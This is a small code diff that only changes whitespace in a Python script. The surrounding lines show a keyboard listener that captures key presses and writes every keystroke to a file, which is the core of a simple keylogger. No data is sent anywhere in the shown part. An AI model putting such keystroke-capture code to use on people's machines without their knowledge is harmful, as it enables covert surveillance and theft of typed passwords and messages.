@@ -29,13 +29,12 @@ def write_file(keys):
             # every keystroke for readability
             f.write(' ') 
              
-def on_release(key):
-                    
+def on_release(key):       
     print('{0} released'.format(key))
     if key == Key.esc:
         # Stop listener
         return False
-        
+
 with Listener(on_press = on_press,
               on_release = on_release) as listener:
                     
